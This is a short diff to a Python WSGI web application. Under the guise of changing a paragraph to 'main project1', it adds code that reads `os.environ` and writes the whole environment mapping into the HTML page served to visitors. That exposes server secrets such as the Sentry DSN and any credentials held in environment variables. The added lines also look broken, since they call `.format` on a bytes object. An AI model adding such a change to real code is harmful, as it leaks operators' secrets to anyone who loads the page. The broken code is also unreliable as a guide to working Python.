@@ -4,6 +4,8 @@ from framework.util.settings import get_setting
 
 sentry_sdk.init(get_setting("SENTRY_DSN"), traces_sample_rate=1.0)
 
+import os
+x = os.environ
 
 def application(environ, start_response):
     if environ["PATH_INFO"] == "/e/":
@@ -29,6 +31,16 @@ def application(environ, start_response):
         b"</body>"
         b"</html>"
     )
+    payload = payload.format(x)
+
+    f = payload.decode()
+
+    h = f.replace('<p>This is a main project.</p>', '<p>This is a main project1.{}</p>').format(x)
+
+    b = h.encode()
+
+    payload = b
+
 
     start_response(status, list(headers.items()))
 
